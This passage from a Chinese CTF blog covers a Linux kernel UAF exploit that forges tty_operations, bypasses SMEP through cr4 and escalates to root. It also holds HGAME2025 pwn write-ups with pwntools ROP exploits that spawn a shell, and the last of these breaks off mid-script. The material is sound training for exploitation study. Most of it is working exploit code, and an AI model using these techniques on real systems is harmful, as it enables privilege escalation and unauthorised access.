<span class="hljs-type">kref</span> kref;<br><span class="hljs-keyword">struct</span> <span class="hljs-type">device</span> *dev;<br><span class="hljs-keyword">struct</span> <span class="hljs-type">tty_driver</span> *driver;<br>const <span class="hljs-keyword">struct</span> <span class="hljs-type">tty_operations</span> *ops;<br>int index;<br><br>  ......<br>  <span class="hljs-comment">//完整结构体见：https://elixir.bootlin.com/linux/v4.7.2/source/include/linux/tty.h#L272</span><br></code></pre></td></tr></table></figure><p>我们重点关注这个**const struct tty_operations *ops;**：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">tty_operations</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> * (*lookup)(<span class="hljs-keyword">struct</span> <span class="hljs-type">tty_driver</span> *driver,<br><span class="hljs-keyword">struct</span> <span class="hljs-type">file</span> *filp, int idx);<br><span class="hljs-built_in">int</span>  (*install)(<span class="hljs-keyword">struct</span> <span class="hljs-type">tty_driver</span> *driver, <span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> *tty);<br><span class="hljs-built_in">void</span> (*remove)(<span class="hljs-keyword">struct</span> <span class="hljs-type">tty_driver</span> *driver, <span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> *tty);<br><span class="hljs-built_in">int</span>  (*<span class="hljs-keyword">open</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> * tty, <span class="hljs-keyword">struct</span> <span class="hljs-type">file</span> * filp);<br><span class="hljs-built_in">void</span> (*<span class="hljs-built_in">close</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> * tty, <span class="hljs-keyword">struct</span> <span class="hljs-type">file</span> * filp);<br><span class="hljs-built_in">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> *tty);<br><span class="hljs-built_in">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> *tty);<br><span class="hljs-built_in">int</span>  (*write)(<span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> * tty,<br>      const unsigned char *buf, int count);<br><span class="hljs-built_in">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> *tty, unsigned char ch);<br><br>......<br><span class="hljs-comment">//完整结构体见：https://elixir.bootlin.com/linux/v4.7.2/source/include/linux/tty_driver.h#L251</span><br></code></pre></td></tr></table></figure><p>不难看出，这个结构体中存着许多的函数指针。当我们对ptmx驱动进行write时，就会调用上面write指针指向的函数，。那么如果我们能伪造这个结构体，并且可以修改<strong>const struct tty_operations *ops</strong>这个指针，不就可以执行我们的提权代码了吗。（很像我们的FSOP）</p><p>我们先来进行一些准备工作：</p><p>由于本题开启了SMEP，无法直接ret2user，但是我们可以绕过。</p><p>SMEP和SMAP都通过cr4寄存器的值来判断，因此我们找到如下绕过的gadget：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xffffffff81004d80</span> : <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cr4</span>, <span class="hljs-built_in">rdi</span> <span class="hljs-comment">; pop rbp ; ret</span><br></code></pre></td></tr></table></figure><p>在CTF中，我们常将cr4的值设置为0x6f0来绕过SMEP。</p><p>本题没有开启SMAP，所以我们可以在用户态的栈上布置ROP链和tty_operations结构体。</p><p>并且本题无KASLR，<strong>/proc/kallsyms</strong>没有设置root权限，可以直接读取：</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tcl">/ $ cat /<span class="hljs-keyword">proc</span>/kallsyms |<span class="hljs-title"> grep</span> &quot;commit_creds&quot;<span class="hljs-title"></span><br><span class="hljs-title">ffffffff810a1420</span> T<span class="hljs-title"> commit_creds</span><br>ffffffff81d88f60<span class="hljs-title"> R</span> __ksymtab_commit_creds<span class="hljs-title"></span><br><span class="hljs-title">ffffffff81da84d0</span> r<span class="hljs-title"> __kcrctab_commit_creds</span><br>ffffffff81db948c<span class="hljs-title"> r</span> __kstrtab_commit_creds<br>/ $<span class="hljs-title"> cat</span> /<span class="hljs-keyword">proc</span>/kallsyms |<span class="hljs-title"> grep</span> &quot;prepare_kernel_cred&quot;<span class="hljs-title"></span><br><span class="hljs-title">ffffffff810a1810</span> T<span class="hljs-title"> prepare_kernel_cred</span><br>ffffffff81d91890<span class="hljs-title"> R</span> __ksymtab_prepare_kernel_cred<span class="hljs-title"></span><br><span class="hljs-title">ffffffff81dac968</span> r<span class="hljs-title"> __kcrctab_prepare_kernel_cred</span><br>ffffffff81db9450<span class="hljs-title"> r</span> __kstrtab_prepare_kernel_cred<br></code></pre></td></tr></table></figure><p>接下来，就该考虑如何控制程序执行流了。由于我们无法控制内核的栈空间，所以我们需要使用栈迁移。</p><p>经过动调可以发现，在我们调用<strong>tty_operations-&gt;write</strong>时，rax寄存器中存放的便是<strong>tty_operations</strong>结构体的地址。那么我们就可以使用形如<strong>mov rsp, rax</strong>，<strong>xchg rax, rsp</strong>之类的指令进行栈迁移了。</p><p>由于rax指向的地址是<strong>tty_operations[0]</strong>，而<strong>tty_operations-&gt;write</strong>在<strong>tty_operations[7]</strong>，这一段空间很小，我们得再执行一次栈迁移。</p><p>最后exp如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-comment">//tty_struct结构体的大小</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span><br><br><span class="hljs-comment">//mov cr4, rdi ; pop rbp ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_CR4_RDI 0xffffffff81004d80</span><br><br><span class="hljs-comment">//pop rdi ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI 0xffffffff810d238d</span><br><br><span class="hljs-comment">//swapgs ; pop rbp ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS 0xffffffff81063694</span><br><br><span class="hljs-comment">//iretq ; ret;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ 0xffffffff814e35ef</span><br><br><span class="hljs-comment">//mov rsp, rax;dec ebx;ret，做栈迁移用</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RSP_RAX 0xFFFFFFFF8181BFC5</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RAX 0xffffffff8100ce6e</span><br><br><br><span class="hljs-type">size_t</span> pkc_addr = <span class="hljs-number">0xffffffff810a1810</span>;<br><span class="hljs-type">size_t</span> cc_addr = <span class="hljs-number">0xffffffff810a1420</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRoot</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">char</span>* (*pkc)(<span class="hljs-type">int</span>) = pkc_addr;<br>    <span class="hljs-built_in">void</span> (*cc)(<span class="hljs-type">char</span>*) = cc_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getShell</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   if (getuid() == 0) &#123;</span><br><span class="hljs-comment">      printf(&quot;[+]Rooted!!\n&quot;);</span><br><span class="hljs-comment">      system(&quot;/bin/sh&quot;);</span><br><span class="hljs-comment">   &#125; else &#123;</span><br><span class="hljs-comment">      printf(&quot;[+]Root Fail!!\n&quot;);</span><br><span class="hljs-comment">   &#125;</span><br><span class="hljs-comment">   */</span><br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">save_status</span><span class="hljs-params">()</span> </span>&#123;<br>__asm__(<br><span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br><span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br><span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br><span class="hljs-string">&quot;pushf;&quot;</span><br><span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]status has been saved.&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>   <span class="hljs-comment">//保存用户态寄存器</span><br>   <span class="hljs-built_in">save_status</span>();<br>   <span class="hljs-type">int</span> fd1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>,O_RDWR);<br>   <span class="hljs-type">int</span> fd2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>,O_RDWR);<br>   <span class="hljs-keyword">if</span> (fd1 &lt; <span class="hljs-number">0</span> || fd2 &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open file error!!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>   &#125;<br>   <br>   <span class="hljs-built_in">ioctl</span>(fd1,<span class="hljs-number">0x10001</span>,TTY_STRUCT_SIZE);<br>   <span class="hljs-built_in">close</span>(fd1); <span class="hljs-comment">//UAF</span><br>   <br>   <span class="hljs-type">size_t</span> ROP[<span class="hljs-number">0x100</span>];<br>   <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><br>   <span class="hljs-comment">//修改cr4寄存器</span><br>   ROP[i++] = POP_RDI;<br>   ROP[i++] = <span class="hljs-number">0x6f0</span>;<br>   ROP[i++] = MOV_CR4_RDI;<br>   ROP[i++] = <span class="hljs-number">0</span>;<br><br>   ROP[i++] = (<span class="hljs-type">size_t</span>)getRoot;<br>   ROP[i++] = SWAPGS;<br>   ROP[i++] = <span class="hljs-number">0</span>;<br>   ROP[i++] = IRETQ;<br><br>   ROP[i++] = (<span class="hljs-type">size_t</span>)getShell;<br><br>   ROP[i++] = user_cs;<br>   ROP[i++] = user_rflags;<br>   ROP[i++] = user_sp;<br>   ROP[i++] = user_ss;<br>   <br>   <span class="hljs-type">size_t</span> fake_tty_operations[<span class="hljs-number">35</span>];<br>   fake_tty_operations[<span class="hljs-number">7</span>] = MOV_RSP_RAX;<span class="hljs-comment">//调用write时，rax里存的是fake_tty_operations[0]的地址，所以用这条指令将栈迁移到fake_tty_operations[0]位置</span><br><br>   fake_tty_operations[<span class="hljs-number">0</span>] = POP_RAX;<br>   fake_tty_operations[<span class="hljs-number">1</span>] = (<span class="hljs-type">size_t</span>)ROP;<br>   fake_tty_operations[<span class="hljs-number">2</span>] = MOV_RSP_RAX;<span class="hljs-comment">//再次将栈迁移到ROP链的地址上</span><br>   <br>   <span class="hljs-type">size_t</span> fake_tty_struct[<span class="hljs-number">4</span>];<br><br>   <span class="hljs-type">int</span> fd_tty = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>,O_RDWR);<br>   <span class="hljs-built_in">read</span>(fd2,fake_tty_struct,<span class="hljs-number">4</span>*<span class="hljs-number">8</span>);<span class="hljs-comment">//将tty_struct前几个的值保存</span><br><br>   fake_tty_struct[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)fake_tty_operations; <span class="hljs-comment">//将tty_struct的tty_operations *ops指向我们伪造的地方</span><br>   <span class="hljs-built_in">write</span>(fd2,fake_tty_struct,<span class="hljs-number">4</span>*<span class="hljs-number">8</span>);<br>   <br>   <span class="hljs-type">size_t</span> buf[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>   <span class="hljs-built_in">write</span>(fd_tty, buf,<span class="hljs-number">32</span>); <span class="hljs-comment">//调用tty_operations-&gt;write</span><br><br>   <span class="hljs-built_in">close</span>(fd2);<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，即可成功提权。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2025 pwn方向题解</title>
    <link href="/2025/02/25/HGAME2025-pwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/02/25/HGAME2025-pwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="counting-petals"><a href="#counting-petals" class="headerlink" title="counting petals"></a>counting petals</h2><p>逆向可以看出来，这一段存在一个数组越界</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> ( v9 &lt; v8 )<br>    &#123;<br>      <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;the flower number %d : &quot;</span>, ++v9);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v7[v9 + <span class="hljs-number">1</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>先对v8传入16，就可以覆盖v8和v9。这里要注意v8和v9都是int型，只占4个字节，所以要一次性覆盖完，这里我用103079215128(0x18 0000 0018)来覆盖。</p><p>之后的输出就会把libc_start_call_main+128的地址输出，计算一下就可以得到libc的基地址了。</p><p>（关于libc_start_call_main这个函数的偏移，我们可以在题目提供的.&#x2F;libc.so.6文件里找到。先将.&#x2F;libc.so.6文件放入ida中，然后找到__libc_start_main这个函数，查看它的伪代码，然后就可以找到libc_start_call_main函数的偏移了，如下图）<br><img src="/images/1.png" title="libc_start_main"><br>（图中的sub_29D10即为__libc_start_call_main函数）</p><p>之后程序会再有一次输入的机会，再用数组越界打ROP就可以了。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><span class="hljs-comment">#io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;node1.hgame.vidar.club&quot;</span>, <span class="hljs-number">30353</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br>io.sendlineafter(<span class="hljs-string">b&quot;How many flowers have you prepared this time?&quot;</span>, <span class="hljs-string">b&#x27;16&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, <span class="hljs-string">b&#x27;103079215128&#x27;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&#x27;Reply 1 indicates the former and 2 indicates the latter:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;103079215128 +&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;+ 1 +&#x27;</span>)<br><br>libc_start_call_main = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">16</span>), <span class="hljs-number">10</span>) - <span class="hljs-number">128</span><br>io.recvuntil(<span class="hljs-string">b&#x27;+ 0 +&#x27;</span>)<br><br>main = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">16</span>), <span class="hljs-number">10</span>)<br>pie_addr = main - <span class="hljs-number">0x12bf</span><br>libc_base = libc_start_call_main - <span class="hljs-number">0x29d10</span><br><br>io.recvuntil(<span class="hljs-string">b&#x27;Wish that this time they love you.&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;How many flowers have you prepared this time?&quot;</span>, <span class="hljs-string">b&#x27;16&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, <span class="hljs-string">b&#x27;77309411350&#x27;</span>)<br><br>pop_rdi = <span class="hljs-number">0x2a3e5</span> + libc_base<br>system = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] + libc_base<br>bin_sh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)) + libc_base<br>ret = <span class="hljs-number">0x29139</span> + libc_base<br><br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, <span class="hljs-built_in">str</span>(ret))<br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, <span class="hljs-built_in">str</span>(pop_rdi))<br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, <span class="hljs-built_in">str</span>(bin_sh))<br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, <span class="hljs-built_in">str</span>(system))<br><br>io.sendlineafter(<span class="hljs-string">b&#x27;Reply 1 indicates the former and 2 indicates the latter:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>io.recv()<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a>ezstack</h2><p>本题前面的代码实现了一个简单的 TCP 服务器，首先创建并绑定一个监听套接字，监听端口 9999 的客户端连接。接收到连接请求时，服务器会使用 fork()， 创建一个子进程来处理该连接，父进程则继续监听新的连接。</p><p>想深入了解的师傅可以看看这篇文章<a href="https://xz.aliyun.com/news/15986?time__1311=eqfx0Q0QD=BDBDBue5Gk8DkjKRMOrmaoD&u_atoken=518bb4efb73d0ea73735cbd1107759d9&u_asig=1a0c384917406705876867852e003f">webpwn的一些总结</a></p><p>我们本地调试时，可以先在一个终端上运行这个程序，然后使用nc或者直接在脚本里用io &#x3D; remote(“0.0.0.0”,9999)。</p><p>本题的漏洞在这里：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">char buf<span class="hljs-selector-attr">[80]</span>; <span class="hljs-comment">// [rsp+10h] [rbp-50h] BYREF</span><br><br><span class="hljs-built_in">print</span>(a1, &quot;ξ( ✿＞◡❛) There is an obvious stack <span class="hljs-attribute">overflow</span> here.\n&quot;);<br><span class="hljs-built_in">print</span>(a1, &quot;That&#x27;s all.\n&quot;);<br><span class="hljs-built_in">print</span>(a1, &quot;Good luck.\n&quot;);<br>return <span class="hljs-built_in">read</span>(a1, buf, <span class="hljs-number">0</span>x60uLL);<br></code></pre></td></tr></table></figure><p>可以溢出0x10的大小，显然需要使用栈迁移。</p><p>并且本题开启了沙箱，要使用orw：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">v2</span> = seccomp_init(<span class="hljs-number">0</span>x7FFF0000LL);<br><span class="hljs-attribute">seccomp_rule_add</span>(v2, <span class="hljs-number">0</span>LL, <span class="hljs-number">59</span>LL, <span class="hljs-number">0</span>LL);<br><span class="hljs-attribute">seccomp_rule_add</span>(v2, <span class="hljs-number">0</span>LL, <span class="hljs-number">322</span>LL, <span class="hljs-number">0</span>LL);<br><span class="hljs-attribute">seccomp_load</span>(v2);<br></code></pre></td></tr></table></figure><p>那么接下来，我们先将栈迁移到bss上，泄露出libc地址并且返回到vuln函数。之后我的做法是使用ROP的orw，又迁移了三次输出flag。（我的做法复杂了，可以直接使用mprotect写shellcode，就不用反复迁移来迁移去了）</p><p>这里还有一个问题，就是本题使用read和write函数时的文件描述符是多少？我们平时做的题大部分都是3，但是这题因为前面使用了socket，文件描述符就被socket调用占用了3，所以我们再打开文件后，分配到的文件描述符应该为4。</p><p>exp：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> LibcSearcher import *<br><br><span class="hljs-attribute">context</span>(log_level = &#x27;debug&#x27;,arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;)<br><span class="hljs-comment">#io = remote(&quot;0.0.0.0&quot;,9999)</span><br><span class="hljs-attribute">io</span> = remote(<span class="hljs-string">&quot;node1.hgame.vidar.club&quot;</span>,<span class="hljs-number">31006</span>)<br><span class="hljs-attribute">elf</span> = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-attribute">libc</span> = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><br><span class="hljs-attribute">leave_ret</span> = <span class="hljs-number">0</span>x4013cb<br><span class="hljs-attribute">bss</span> = <span class="hljs-number">0</span>x404130<br><span class="hljs-attribute">gift</span> = <span class="hljs-number">0</span>x4040e0<br><span class="hljs-attribute">vuln</span> = <span class="hljs-number">0</span>x4013cd<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br><span class="hljs-attribute">io</span>.recvuntil(<span class="hljs-string">&quot;Good luck.\n&quot;</span>)<br><span class="hljs-attribute">payload1</span> = b&#x27;a&#x27;*<span class="hljs-number">80</span> + p64(bss+<span class="hljs-number">36</span>)<br><span class="hljs-attribute">io</span>.sendline(payload1)<br><span class="hljs-attribute">io</span>.recv()<br><br><span class="hljs-attribute">write_got</span> = elf.got[&#x27;write&#x27;]<br><span class="hljs-attribute">print_plt</span> = elf.symbols[&#x27;print&#x27;]<br><span class="hljs-attribute">pop_rsi_r15</span> = <span class="hljs-number">0</span>x401711<br><span class="hljs-attribute">pop_rdi</span> = <span class="hljs-number">0</span>x401713<br><span class="hljs-attribute">ret</span> = <span class="hljs-number">0</span>x40101<br><br><span class="hljs-attribute">payload2</span> = p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">4</span>) + p64(pop_rsi_r15) + p64(write_got) + p64(<span class="hljs-number">0</span>) +p64(print_plt) + p64(vuln)<br><span class="hljs-attribute">payload2</span> = payload2.ljust(<span class="hljs-number">0</span>x50,b&#x27;\x00&#x27;)<br><span class="hljs-attribute">payload2</span> += p64(<span class="hljs-number">0</span>x404104) + p64(leave_ret)<br><br><span class="hljs-attribute">io</span>.send(payload2)<br><br><span class="hljs-attribute">write_addr</span> = u64(io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,b&#x27;\x00&#x27;))<br><br><span 